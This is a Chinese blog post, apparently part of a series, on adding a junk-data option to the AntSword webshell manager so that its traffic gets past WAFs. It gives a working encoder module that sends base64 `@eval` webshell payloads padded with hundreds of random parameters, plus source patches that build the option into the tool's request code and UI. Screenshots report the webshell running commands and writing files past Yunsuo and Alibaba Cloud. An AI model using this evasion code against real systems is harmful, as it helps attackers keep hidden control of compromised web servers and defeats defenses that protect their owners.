# 蚁剑改造计划之增加垃圾数据


<meta name="referrer" content="no-referrer" />

## 前言

本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。

因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。

不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。

## 正文

### 思路简介

大家都知道垃圾数据填充可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤，大家常常把这种方法叫做缓冲区溢出。

原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。

同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，只不过要稍加修改。因为实际测试过程中发现，仅仅在payload前面加上超长字符串对于某里云来说并没有卵用，似乎已经免疫。但是换了个思路，发现改成增加大量垃圾键值对之后就可以bypass，那就暂且把这种方法叫做增加垃圾数据绕过法吧。

这篇文章主要介绍这种方法，以及如何把这个功能移植到蚁剑上。

### 编码器实现

这篇文章本来是几个月前发在自己的星球里，名字叫做`蚁剑编码器之流量混淆`。当时想着怎么方便怎么来，所以采用的是最简单、改动最小的一种实现方式--编码器实现。

这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。

```
let varname_min = 5; //变量名最小长度
  let varname_max = 15; // 变量名最大长度
  let data_min = 200; // 变量值最小长度
  let data_max = 250; // 变量值最大长度
  let num_min = 150; // 变量最小个数
  let num_max = 250; // 变量最大个数
  function randomString(length) { // 生成随机字符串
    //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
  }
  function randomInt(min, max) {   //生成指定范围内的随机数
    return parseInt(Math.random() * (max - min + 1) + min, 10);
  }
  for (let i = 0; i < randomInt(num_min, num_max); i++) {  //将混淆流量放入到payload数组中
    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
  }
```

那么怎么用呢

很简单，就直接把这段代码放到普通编码器里就可以了，这里以最基础的也是被各类WAF杀得妈都不认的base64编码器为例

```
'use strict';
/*
code by yzddMr6
*/
module.exports = (pwd, data, ext = {}) => {
  let varname_min = 5;
  let varname_max = 15;
  let data_min = 200;
  let data_max = 250;
  let num_min = 100;
  let num_max = 200;
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = Buffer.from(data['_']).toString('base64');
  function randomString(length) {
    //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
  }
  function randomInt(min, max) {
    return parseInt(Math.random() * (max - min + 1) + min, 10);
  }
  for (let i = 0; i < randomInt(num_min, num_max); i++) {
    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
  }
  data[pwd] = `@eval(base64_decode($_POST[${randomID}]));`;
  delete data['_'];
  return data;
}
```

### 过云锁测试

本来想用安全狗，结果发现好像免费版不能拦截一句话。

那就用云锁开刀吧。

首先在虚拟机里放个一句话，就用某辣鸡项目生成的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369455-b57aa2d5-3b90-45f6-b9c4-c9cb1ed70914.png)

可以正常运行

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369538-70a55a46-56a0-40b8-ac62-c252510baa44.png)

然后使用蚁剑默认的base64编码器连接试一下

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369645-e9227333-70e6-41c2-8262-b785424db16a.png)

云锁直接drop了数据包，没有返回，在云锁控制端显示受到攻击

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369742-44ebc878-ca46-4288-a3e2-2016b3168778.png)

然后使用我们上面的流量混淆编码器

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369957-63746007-1497-449c-957d-2a70acb6a7c7.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370077-6ec53d5d-14f0-4ad2-99f4-4f2928c239b6.png)

shell正常连接，成功bypass云锁。

### 过阿里云测试

这一部分是后来补上的，因为白嫖的阿里云还有一天就到期了。。。

众所周知阿里云是以封IP著名，一言不合就全网ban你。不仅站x不了，甚至很多其他网站都打不开。。。

反正要到期了，码也懒得打了。

首先用backdoor study搭建个环境

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370185-1169c050-8aff-420a-bfbf-046b1475db12.png)

这时候要找一个免杀马放上去，不然的话连接之前就被阿里云ban了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370469-02121aa6-fec3-4d43-b1ef-07b513039016.png)

然后随便找个蚁剑的默认编码器连上去，第一个包还有回显，发第二个包的时候就已经被封IP了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370710-726b5357-1ccb-4d30-a4c2-a6ad0fd90edc.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370883-ad7bb739-001e-4afd-8eeb-2f25de9816da.png)

这时候换上加了垃圾数据污染后的编码器

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371022-c6b8f105-7748-4583-9e7a-82cdf76586a5.png)

正常执行命令

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371173-42b728fa-5d9e-4cb9-9f4d-2970b640dc43.png)

写文件测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371623-42456d01-7a4d-4138-9cf0-51346b56d76e.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371745-db176d01-8198-41ff-a759-5edbb95d0133.png)

bypass阿里云

### 蚁剑核心功能实现

理论上这种方法不管是asp php aspx jsp都可以用到，如果按照编码器实现的话就要建立四个编码器，觉得还是加入到核心功能中比较好。

这几天看了一下蚁剑的架构，感叹于设计者思路的精妙。

首先我们可以看看他modules目录下的request模块的内容

可以看到两个if else 语句

```
/**
   * 监听HTTP请求
   * @param  {Object} event ipcMain事件对象
   * @param  {Object} opts  请求配置
   * @return {[type]}       [description]
   */
  onRequest(event, opts) {
    logger.debug('onRequest::opts', opts);
    if (opts['url'].match(CONF.urlblacklist)) {
      return event
        .sender
        .send('request-error-' + opts['hash'], "Blacklist URL");
    }
    let _request = superagent.post(opts['url']);
    // 设置headers
    _request.set('User-Agent', USER_AGENT);
    // 自定义headers
    for (let _ in opts.headers) {
      _request.set(_, opts.headers[_]);
    }
    // 自定义body
    const _postData = Object.assign({}, opts.body, opts.data);
    if (opts['useChunk'] == 1) {
      logger.debug("request with Chunked");
      let _postarr = [];
      for (var key in _postData) {
        if (_postData.hasOwnProperty(key)) {
          let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) {
            return unescape($1);
          }); // 后续可能需要二次处理的在这里追加
          _postarr.push(`${key}=${_tmp}`);
        }
      }
      let antstream = new AntRead(_postarr.join("&"), {
        'step': parseInt(opts['chunkStepMin']),
        'stepmax': parseInt(opts['chunkStepMax'])
      });
	xxxxxxx
    } else {
      // 通过替换函数方式来实现发包方式切换, 后续可改成别的
      const old_send = _request.send;
      let _postarr = [];
      if (opts['useMultipart'] == 1) {
        _request.send = _request.field;
        for (var key in _postData) {
          if (_postData.hasOwnProperty(key)) {
            let _tmp = (_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) {
              return unescape($1)
            });
            _postarr[key] = _tmp;
          }
        }
      } else {
        _request.send = old_send;
        for (var key in _postData) {
          if (_postData.hasOwnProperty(key)) {
            let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) {
              return unescape($1)
            }); // 后续可能需要二次处理的在这里追加
            _postarr.push(`${key}=${_tmp}`);
          }
        }
        _postarr = _postarr.join('&');
      }
```

大概就是说如果开启了chunk传输后不拉不拉，否则的话就看看是否开启了Multipart，如果开启了不拉不拉，否则咕叽咕叽。

主要的payload是以字典的形式放到`_postData`中，然后字典键跟值用`=`连接后放到`_postarr`数组中，最后再把`_postarr`数组用`&`连接起来就是我们最终发包的payload了。

那么这里也就是我们要下手修改的地方，照葫芦画瓢，再增加一个else语句

因为我这里都改好了，就直接截图说要改哪些点吧。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372169-981f7614-2581-4768-99fe-d78a4aa5cbce.png)

```
opts`为在界面中选择的选项，这里起个名字叫`addMassData
```

然后要到`source/core/base.js`中增加你的配置选项，注意的是蚁剑把普通请求跟下载请求的发包是分开的，所以需要改两处，自己vscode搜一下改一下。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372297-32e8a64b-060d-49db-9770-ba8656462375.png)

```
// 发送请求数据
        .send('request', {
          url: this.__opts__['url'],
          hash: hash,
          data: opt['data'],
          tag_s: opt['tag_s'],
          tag_e: opt['tag_e'],
          encode: this.__opts__['encode'],
          ignoreHTTPS: (this.__opts__['otherConf'] || {})['ignore-https'] === 1,
          useChunk: (this.__opts__['otherConf'] || {})['use-chunk'] === 1,
          chunkStepMin: (this.__opts__['otherConf'] || {})['chunk-step-byte-min'] || 2,
          chunkStepMax: (this.__opts__['otherConf'] || {})['chunk-step-byte-max'] || 3,
          useMultipart: (this.__opts__['otherConf'] || {})['use-multipart'] === 1,
          addMassData: (this.__opts__['otherConf'] || {})['add-MassData'] === 1,
          useRandomVariable: (this.__opts__['otherConf'] || {})['use-random-variable'] === 1,
          timeout: parseInt((this.__opts__['otherConf'] || {})['request-timeout']),
          headers: (this.__opts__['httpConf'] || {})['headers'] || {},
          body: (this.__opts__['httpConf'] || {})['body'] || {}
        });
    })
  }
```

后端改完之后要改前端了，前端修改内容是在`source\modules\shellmanager\list\form.js`中存放

增加一个checkbox，注意label名字不要写错。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372393-31a72077-ae9b-4a43-afb8-88721c926793.png)

然后改语言文件，这个没什么好说的。

全部改完之后重启蚁剑(注意是把软件x掉重新双击打开，否则某些改动不会更新)，设置中就可以看到我们新增加的`增加垃圾数据`选项了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372511-35245f04-63c2-4337-9672-96db544a9652.png)

选中后发包测试一下

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372603-089041d9-6a58-4d3d-8079-40191a30fb14.png)

可以看到已经成功啦 一半

接着发现一个奇怪的问题，每次payload都是在第一个

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372774-c60a50e9-cf56-490c-baeb-54de7eb14e5f.png)

这样肯定是不行的，所以我们还需要写一个随机函数，让字典随机排序

没有现成的函数，随手搓一个

附上辣鸡代码

```
function randomDict(dic){
  let tmparray=[]
  for(let i in dic){
    tmparray.push(i)
  }
  tmparray=tmparray.sort((a, b)=> { return Math.random() > 0.5 ? -1 : 1; })
  let finaldata={}
  tmparray.forEach(i => {
      finaldata[i]=dic[i]
});
return finaldata
}
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900372902-cdccc388-b0b1-49ba-8ba4-ed3d08978725.png)

然后出现了点小插曲

因为`_postData`是const类型，不能直接修改

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373008-da70aeb2-e5c2-40a1-8cea-3f874859fed1.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373095-e4a235a3-e59a-4878-938d-527018aa9e2d.png)

既然追求刺激，那就贯彻到底啦，直接改成let

再试一下就可以实现字典随机排序了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373179-7c93c8a9-b5dd-43dd-a935-30eb1212f5b5.png)

发现还可以正常使用，改了就改了吧

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373366-94096e9d-c11f-4f85-a554-4f8aae2e7aa1.png)

### asp测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373478-cee503e8-88c8-4e68-9d7f-b77a3226adeb.png)

### aspx测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373625-d9f7d845-0bd5-4425-b6b9-e585cc7fab24.png)

asp,aspx类型的shell都可以正常使用

## 最后

参数个数可以根据实际情况自行修改，不过一般也不需要改，所以就没有写到UI中。

把参数个数改大可能会绕过更多waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。
